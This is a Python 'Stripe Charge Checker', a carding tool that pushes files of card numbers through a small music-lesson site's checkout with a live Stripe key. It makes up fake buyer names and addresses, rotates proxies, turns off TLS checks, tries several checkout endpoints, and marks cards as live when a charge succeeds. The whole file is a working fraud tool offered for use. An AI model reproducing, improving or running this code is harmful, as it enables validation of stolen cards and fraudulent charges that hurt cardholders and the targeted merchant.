"""
Stripe Charge Checker — charges through gospelpianosimple.com/checkout
"""
import asyncio
import re
import json
import random
import uuid
import warnings
import aiohttp
from datetime import datetime

warnings.filterwarnings('ignore')

STRIPE_KEY = "pk_live_MtxwO3obi7pfD7UZlGkfR2yj"
LOCATION_ID = "aIfbkdsjbDMNd2jXVzkv"
PRODUCT_ID = "698502efdd3a3371f5ffba3f"
STRIPE_PRICE_ID = "price_1SyLQ2HGUqx8Rh4ctWH7LU6f"
CHECKOUT_URL = "https://gospelpianosimple.com/checkout"
DOMAIN = "https://gospelpianosimple.com"

# ──────────────── realistic fake data ───────────────────────────────

FIRST_NAMES = [
    'James','Mary','John','Patricia','Robert','Jennifer','Michael','Linda',
    'David','Elizabeth','William','Barbara','Richard','Susan','Joseph','Jessica',
    'Thomas','Sarah','Christopher','Karen','Charles','Lisa','Daniel','Nancy',
    'Matthew','Betty','Anthony','Margaret','Mark','Sandra','Steven','Ashley',
]

LAST_NAMES = [
    'Smith','Johnson','Williams','Brown','Jones','Garcia','Miller','Davis',
    'Rodriguez','Martinez','Hernandez','Lopez','Gonzalez','Wilson','Anderson',
    'Thomas','Taylor','Moore','Jackson','Martin','Lee','Perez','Thompson',
    'White','Harris','Sanchez','Clark','Ramirez','Lewis','Robinson',
]

STREETS = [
    'Oak St','Maple Ave','Elm St','Main St','Pine Rd','Cedar Ln',
    'Birch Dr','Walnut Ave','Cherry St','Willow Dr','Spruce Ct',
    'Park Ave','Broadway','Lake Dr','Hill Rd','River Rd',
]

CITIES = ['New York','Los Angeles','Chicago','Houston','Phoenix','Philadelphia',
          'San Antonio','San Diego','Dallas','Austin','Miami','Denver']

STATES = ['NY','CA','IL','TX','AZ','PA','FL','CO','NV','WA','OR','GA']

EMAIL_DOMAINS = ['gmail.com','outlook.com','outlook.fr','hotmail.com',
                 'yahoo.com','protonmail.com','aol.com','icloud.com']


def guid():
    return str(uuid.uuid4())


def random_email():
    name = random.choice(FIRST_NAMES).lower()
    lname = random.choice(LAST_NAMES).lower()
    num = random.randint(10, 9999)
    return "%s%s%d@%s" % (name, lname, num, random.choice(EMAIL_DOMAINS))


def random_phone():
    return "+1%d" % random.randint(2000000000, 9999999999)


def random_name():
    return "%s %s" % (random.choice(FIRST_NAMES), random.choice(LAST_NAMES))


def random_address():
    street = "%d %s" % (random.randint(100, 9999), random.choice(STREETS))
    city = random.choice(CITIES)
    state = random.choice(STATES)
    zipcode = "%05d" % random.randint(10000, 99999)
    return street, city, state, zipcode


def parse_proxy_line(line: str):
    line = line.strip()
    if not line:
        return None
    protocol = 'http'
    if '://' in line:
        protocol, rest = line.split('://', 1)
    else:
        rest = line
    auth = None
    address = None
    if '@' in rest:
        left, right = rest.split('@', 1)
        if ':' in left and ':' not in right:
            auth = left
            address = right
        elif ':' in right and ':' not in left:
            address = left
            auth = right
        else:
            auth = left
            address = right
    else:
        parts = rest.split(':')
        if len(parts) == 2:
            host, port = parts
            address = "%s:%s" % (host, port)
        elif len(parts) == 4:
            host, port, user, pwd = parts
            auth = "%s:%s" % (user, pwd)
            address = "%s:%s" % (host, port)
        else:
            return None
    if auth:
        return "%s://%s@%s" % (protocol, auth, address)
    return "%s://%s" % (protocol, address)


async def process_stripe_charge(card_data, proxy_url=None):
    """
    Full checkout flow:
    1. GET checkout page → establish session
    2. Create Stripe PaymentMethod
    3. POST to checkout API (tries multiple endpoints + formats)
    """
    timeout = aiohttp.ClientTimeout(total=60)
    connector = aiohttp.TCPConnector(ssl=False)
    cookie_jar = aiohttp.CookieJar()

    # Generate identity for this attempt
    name = random_name()
    email = random_email()
    phone = random_phone()
    street, city, state, zipcode = random_address()

    async with aiohttp.ClientSession(
        timeout=timeout, connector=connector, cookie_jar=cookie_jar
    ) as session:
        try:
            ua = ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                  'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')

            # ── Step 1: GET checkout → establish session ────────
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'user-agent': ua,
                'origin': DOMAIN,
            }
            async with session.get(CHECKOUT_URL, headers=headers, proxy=proxy_url) as resp:
                await resp.text()

            # ── Step 2: Create PaymentMethod via Stripe ──────────
            stripe_headers = {
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': ua,
            }
            stripe_data = {
                'type': 'card',
                'card[number]': card_data['number'],
                'card[cvc]': card_data['cvc'],
                'card[exp_month]': card_data['exp_month'],
                'card[exp_year]': card_data['exp_year'],
                'billing_details[address][country]': 'US',
                'billing_details[address][line1]': street,
                'billing_details[address][city]': city,
                'billing_details[address][state]': state,
                'billing_details[address][postal_code]': zipcode,
                'billing_details[name]': name,
                'billing_details[email]': email,
                'billing_details[phone]': phone,
                'guid': guid(),
                'muid': guid(),
                'sid': guid(),
                'key': STRIPE_KEY,
                'payment_user_agent': 'stripe.js/5e27053bf5',
                '_stripe_version': '2024-06-20',
            }
            async with session.post(
                'https://api.stripe.com/v1/payment_methods',
                headers=stripe_headers, data=stripe_data, proxy=proxy_url,
            ) as pm_resp:
                pm_json = await pm_resp.json()

            if 'error' in pm_json:
                return False, "Stripe: %s" % pm_json['error'].get('message', 'PM error'), pm_json
            pm_id = pm_json.get('id')
            if not pm_id:
                return False, "Stripe: failed to create PM", pm_json

            # ── Step 3: POST checkout to all possible endpoints ──
            # Common fields used across all endpoints
            payload = {
                'paymentMethodId': pm_id,
                'fullName': name,
                'email': email,
                'phone': phone,
                'locationId': LOCATION_ID,
                'productId': PRODUCT_ID,
                'priceId': STRIPE_PRICE_ID,
                'currency': 'usd',
                'street': street,
                'city': city,
                'state': state,
                'zip': zipcode,
            }

            form_payload = {
                'paymentMethodId': pm_id,
                'fullName': name,
                'email': email,
                'phone': phone,
                'locationId': LOCATION_ID,
                'productId': PRODUCT_ID,
            }

            json_headers = {
                'accept': 'application/json, text/plain, */*',
                'content-type': 'application/json',
                'origin': DOMAIN,
                'referer': CHECKOUT_URL,
                'user-agent': ua,
            }

            form_headers = {
                'accept': '*/*',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': DOMAIN,
                'referer': CHECKOUT_URL,
                'user-agent': ua,
                'x-requested-with': 'XMLHttpRequest',
            }

            # Try JSON endpoints first
            json_endpoints = [
                'https://app.gohighlevel.com/v1/checkout/charge',
                'https://app.gohighlevel.com/api/v1/checkout/charge',
                'https://app.gohighlevel.com/v1/checkout/session',
                'https://services.leadconnectorhq.com/checkout/session',
                'https://rest.gohighlevel.com/v1/checkout/session',
            ]

            for url in json_endpoints:
                try:
                    async with session.post(
                        url, json=payload, headers=json_headers, proxy=proxy_url,
                    ) as resp:
                        if resp.status < 500:
                            result = await resp.json()
                            charge_id = (result.get('charge') or result.get('chargeId') or
                                        result.get('id') or '')
                            status = result.get('status', '')
                            if charge_id or 'succeeded' in str(status).lower():
                                return True, "Approved (Charge: %s)" % charge_id, result
                            err = (result.get('error', {}).get('message') or
                                   result.get('message') or json.dumps(result)[:200])
                            return False, err, result
                except (asyncio.TimeoutError, aiohttp.ClientError):
                    continue
                except Exception:
                    continue

            # Try form-encoded POST to checkout URL
            try:
                async with session.post(
                    CHECKOUT_URL, data=form_payload, headers=form_headers, proxy=proxy_url,
                ) as resp:
                    text = await resp.text()
                    try:
                        result = json.loads(text)
                        charge_id = result.get('charge', result.get('chargeId', ''))
                        if charge_id:
                            return True, "Approved (Charge: %s)" % charge_id, result
                        err = result.get('error', {}).get('message',
                                                          result.get('message', 'Declined'))
                        return False, err, result
                    except json.JSONDecodeError:
                        return False, "Declined (HTTP %d)" % resp.status, {'raw': text[:200]}
            except Exception as e:
                return False, "System Error: %s" % str(e), {}

            return False, "All endpoints failed", {}

        except asyncio.TimeoutError:
            return False, "System Error: Request timed out", {}
        except Exception as e:
            return False, "System Error: %s" % str(e), {}


async def check_card(cc, mes, ano, cvv, proxy=None):
    card_data = {'number': cc, 'exp_month': mes, 'exp_year': ano, 'cvc': cvv}
    is_approved, response_msg, charge_data = await process_stripe_charge(card_data, proxy)
    is_live = is_approved or any(kw in response_msg.lower()
                                  for kw in ['approved', 'succeeded', 'charge: ch_'])

    card_info = {}
    charge_id = ''
    if isinstance(charge_data, dict):
        card_info = {
            'brand': charge_data.get('card', {}).get('brand', ''),
            'last4': charge_data.get('card', {}).get('last4', ''),
            'funding': charge_data.get('card', {}).get('funding', ''),
        }
        charge_id = charge_data.get('charge', charge_data.get('chargeId', ''))

    return {
        'cc': "%s|%s|%s|%s" % (cc, mes, ano, cvv),
        'is_live': is_live,
        'response': response_msg,
        'charge_id': charge_id,
        'card_info': card_info,
    }


async def mass_check(file_path, proxies=None, concurrency=10, progress_callback=None):
    if proxies is None:
        proxies = []

    cc_lines = []
    try:
        with open(file_path, 'r') as f:
            for line in f:
                line = line.strip()
                if line:
                    cc_lines.append(line)
    except FileNotFoundError:
        print("File not found: %s" % file_path)
        return []
    if not cc_lines:
        print("No cards to check.")
        return []

    sem = asyncio.Semaphore(concurrency)
    results = [None] * len(cc_lines)
    completed = 0

    async def worker(index, cc_line):
        nonlocal completed
        async with sem:
            parts = cc_line.strip().split('|')
            if len(parts) != 4:
                result = {
                    'cc': cc_line, 'is_live': False,
                    'response': 'Invalid format (need cc|mm|yy|cvv)',
                    'charge_id': '',
                }
            else:
                cc, mes, ano, cvv = parts
                max_retries = 3 if proxies else 1
                used_proxies = set()
                for attempt in range(max_retries):
                    available = [p for p in proxies if p not in used_proxies] if proxies else []
                    proxy = random.choice(available) if available else (
                        random.choice(proxies) if proxies else None)
                    if proxy:
                        used_proxies.add(proxy)
                    result = await check_card(cc, mes, ano, cvv, proxy=proxy)
                    resp = result.get('response', '') or ''
                    if 'System Error' in resp and attempt < max_retries - 1:
                        await asyncio.sleep(1)
                        continue
                    break

            results[index] = result
            completed += 1
            emoji = "[+]" if result['is_live'] else "[-]"
            print("[%d/%d] %s %s - %s" % (completed, len(cc_lines), emoji,
                                           result['cc'], result['response']))
            if progress_callback:
                await progress_callback(result, completed, len(cc_lines))
            return result

    tasks = [asyncio.create_task(worker(i, line)) for i, line in enumerate(cc_lines)]
    await asyncio.gather(*tasks)
    results = [r for r in results if r is not None]
    approved = sum(1 for r in results if r.get('is_live'))
    declined = len(results) - approved
    print("\nFinished: %d approved, %d declined" % (approved, declined))
    return results
